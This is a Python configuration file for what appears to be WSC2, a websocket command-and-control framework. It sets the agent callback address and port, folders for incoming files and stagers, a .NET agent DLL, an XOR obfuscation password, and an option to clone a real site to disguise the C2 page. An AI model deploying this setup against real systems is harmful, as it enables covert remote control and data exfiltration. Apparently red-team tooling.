# -*- coding: utf8 -*-

# Callback IP or FQDN the agent should use to reach this WSC2 server
# This callback IP or FQDN is used in the HTML file as the websocket address to reach this WSC2 server
# as well as in the creation of the stager files
CALLBACK = 'http://192.168.52.134'

# TCP port on which the websocket server will be listening to
PORT = 8080

# Various local directories path
STATICFILES = './static' # Defines the directory for the web server static files
INCOMINGFILES = './incoming' # Defines the directory for the incoming files from the agent
STAGERFILES = './stagers' # Defines the directory for the stager files

# Path to the .Net assembly WSC2 agent
AGENTRELEASE = './agent/release/wsc2.dll'

# Password from which will be derived the xor encryption key
XORPASSWORD = 'thisisafuckingbadpassword'

# Prefix used for the HTML element IDs. This is used by the agent to retrieve these IDs in the HTML page
# You might want to change it to make your version more special
IDPREFIX = 'wsc2'

# If you choose to clone a site to hide WSC2 websocket components in a real looking site
# turn CLONESITE to 'True' and set the website you want to clone
CLONESITE = False
CLONESITE_USERAGENT = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0"
CLONESITE_URL = "https://www.google.com"
